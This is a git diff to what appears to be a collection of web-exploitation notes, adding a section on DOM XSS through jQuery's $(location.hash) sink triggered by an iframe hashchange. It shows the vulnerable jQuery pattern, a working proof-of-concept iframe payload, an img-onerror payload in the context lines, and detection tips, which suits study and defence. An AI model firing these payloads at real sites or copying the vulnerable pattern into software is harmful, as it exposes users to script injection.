@@ -14,6 +14,7 @@
 - [React-Controlled Input Programmatic Filling](#react-controlled-input-programmatic-filling)
 - [Magic Link + Redirect Chain XSS](#magic-link-redirect-chain-xss)
 - [Content-Type via File Extension](#content-type-via-file-extension)
+- [DOM XSS via jQuery Hashchange (Crypto-Cat)](#dom-xss-via-jquery-hashchange-crypto-cat)
 - [Shadow DOM XSS](#shadow-dom-xss)
 - [DOM Clobbering + MIME Mismatch](#dom-clobbering-mime-mismatch)
 - [HTTP Request Smuggling via Cache Proxy](#http-request-smuggling-via-cache-proxy)
@@ -140,6 +141,31 @@ Works for React, Vue, Angular. Essential for automated form filling via DevTools
 noteId = '<img src=x onerror="alert(1)">.html'
 // Response: Content-Type: text/html → XSS
 ```
+
+---
+
+## DOM XSS via jQuery Hashchange (Crypto-Cat)
+
+**Pattern:** jQuery's `$()` selector sink combined with `location.hash` source and `hashchange` event handler. Modern jQuery patches block direct `$(location.hash)` HTML injection, but iframe-triggered hashchange bypasses it.
+
+**Vulnerable pattern:**
+```javascript
+$(window).on('hashchange', function() {
+    var element = $(location.hash);
+    element[0].scrollIntoView();
+});
+```
+
+**Exploit via iframe:** Trigger hashchange without direct user interaction by loading the target in an iframe, then modifying the hash via `onload`:
+```html
+<iframe src="https://vulnerable.com/#"
+  onload="this.src+='<img src=x onerror=print()>'">
+</iframe>
+```
+
+**Key insight:** The iframe's `onload` fires after the initial load, then changing `this.src` triggers a `hashchange` event in the target page. The hash content (`<img src=x onerror=print()>`) passes through jQuery's `$()` which interprets it as HTML, creating a DOM element with the XSS payload.
+
+**Detection:** Look for `$(location.hash)`, `$(window.location.hash)`, or any jQuery selector that accepts user-controlled input from URL fragments.
 
 ---
 
